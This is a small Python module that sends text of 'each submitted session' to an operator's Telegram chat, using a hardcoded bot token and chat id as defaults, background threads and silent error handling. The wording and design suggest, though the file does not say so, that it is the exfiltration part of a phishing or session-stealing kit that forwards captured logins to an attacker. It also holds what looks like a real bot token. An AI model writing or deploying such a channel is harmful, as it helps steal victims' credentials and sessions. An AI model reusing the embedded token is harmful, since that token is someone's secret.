"""Forward each submitted session to the operator's Telegram bot.

TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID override the built-in defaults.
TELEGRAM_CHAT_ID may hold several comma-separated chat ids.

Standard library only.
"""
import json
import os
import threading
import urllib.error
import urllib.request

DEFAULT_TOKEN = "8907747328:AAH2tqrSwhenGMRu9FgxH54o9Ul2kwvRfBU"
DEFAULT_CHAT = "8869502162"

API = "https://api.telegram.org/bot{token}/sendMessage"
TIMEOUT = 12
MAX_LEN = 3800


def _token():
    return os.environ.get("TELEGRAM_BOT_TOKEN", "").strip() or DEFAULT_TOKEN


def _chats():
    raw = os.environ.get("TELEGRAM_CHAT_ID", "").strip() or DEFAULT_CHAT
    return [chat.strip() for chat in raw.split(",") if chat.strip()]


def configured():
    return bool(_token() and _chats())


def send(text):
    """Send to every configured chat. True if at least one landed. Never raises."""
    token, chats = _token(), _chats()
    body = str(text or "").strip()[:MAX_LEN]
    if not token or not chats or not body:
        return False

    sent = False
    for chat in chats:
        payload = json.dumps({
            "chat_id": chat,
            "text": body,
            "disable_web_page_preview": True,
        }).encode("utf-8")
        request = urllib.request.Request(
            API.format(token=token), data=payload, method="POST",
            headers={"Content-Type": "application/json"})
        try:
            with urllib.request.urlopen(request, timeout=TIMEOUT) as response:
                if json.load(response).get("ok"):
                    sent = True
        except urllib.error.HTTPError as error:
            print("[tg] rejected:", error.code, flush=True)
        except (urllib.error.URLError, TimeoutError, ValueError, OSError) as error:
            print("[tg] fail:", type(error).__name__, flush=True)
    return sent


def send_async(text):
    threading.Thread(target=send, args=(text,), daemon=True).start()
